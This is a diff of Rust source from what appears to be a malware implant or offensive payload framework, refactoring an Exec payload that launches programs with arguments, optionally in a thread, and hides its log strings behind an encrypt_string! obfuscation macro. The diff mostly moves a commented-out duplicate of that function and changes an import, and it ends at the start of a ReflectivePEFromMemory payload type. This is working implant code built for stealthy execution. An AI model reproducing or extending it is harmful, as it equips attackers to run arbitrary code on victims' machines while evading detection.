@@ -1,6 +1,6 @@
 use crate::config::Config;
 use crate::link::{Link, LinkFetch};
-use crate::payload_util::calculate_path;
+use crate::utils::calculate_path;
 use crate::payload_util::create_directory;
 use crate::payload_util::same_hash_sha512;
 use crate::payload_util::CommandLine;
@@ -403,48 +403,19 @@ impl WriteFile {
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub struct Exec {
     pub path: String,
+    //pub commandline: CommandLine,
     pub cmdline: String,
     pub thread: bool,
     pub runonce: bool,
     pub visible: bool,
 }
-/*
-impl Exec {
-    // https://doc.rust-lang.org/std/process/struct.Command.html
-    pub fn exec_file(&self) -> Result<PayloadExecThread, anyhow::Error> {
-        let path: PathBuf = calculate_path(&self.path)?;
-        info!("{}{:?} {}", encrypt_string!("Exec "), &path, &self.cmdline);
-        let mut comm = Command::new(&path);
-
-        #[cfg(target_os = "linux")]
-        set_permission(&path);
-
-        for i in self.cmdline.trim().split_whitespace() {
-            comm.arg(i);
-        }
-        if self.thread {
-            let tj: thread::JoinHandle<()> = thread::spawn(move || {
-                let mut c = comm
-                    .spawn()
-                    .expect(&encrypt_string!("failed to execute process"));
-                let _ = c.wait();
-            });
-            return Ok(PayloadExecThread::Thread(tj, Payload::Exec(self.clone())));
-        } else {
-            let _output: std::process::Output = comm
-                .output()
-                .expect(&encrypt_string!("failed to execute process"));
-            //let _hello: Vec<u8> = output.stdout;
-                return Ok(PayloadExecThread::NoThread());
-        };
-    }
-}
-*/
 
 impl Exec {
     // https://doc.rust-lang.org/std/process/struct.Command.html
     pub fn exec_file(&self) -> Result<PayloadExecThread, anyhow::Error> {
         let path: PathBuf = calculate_path(&self.path)?;
+
+
         info!("{}{:?} {}", encrypt_string!("Exec "), &path, &self.cmdline);
         let mut comm = Command::new(&path);
 
@@ -489,6 +460,41 @@ impl Exec {
         };
     }
 }
+
+
+/*
+impl Exec {
+    // https://doc.rust-lang.org/std/process/struct.Command.html
+    pub fn exec_file(&self) -> Result<PayloadExecThread, anyhow::Error> {
+        let path: PathBuf = calculate_path(&self.path)?;
+        info!("{}{:?} {}", encrypt_string!("Exec "), &path, &self.cmdline);
+        let mut comm = Command::new(&path);
+
+        #[cfg(target_os = "linux")]
+        set_permission(&path);
+
+        for i in self.cmdline.trim().split_whitespace() {
+            comm.arg(i);
+        }
+        if self.thread {
+            let tj: thread::JoinHandle<()> = thread::spawn(move || {
+                let mut c = comm
+                    .spawn()
+                    .expect(&encrypt_string!("failed to execute process"));
+                let _ = c.wait();
+            });
+            return Ok(PayloadExecThread::Thread(tj, Payload::Exec(self.clone())));
+        } else {
+            let _output: std::process::Output = comm
+                .output()
+                .expect(&encrypt_string!("failed to execute process"));
+            //let _hello: Vec<u8> = output.stdout;
+                return Ok(PayloadExecThread::NoThread());
+        };
+    }
+}
+*/
+
 
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub struct ReflectivePEFromMemory {
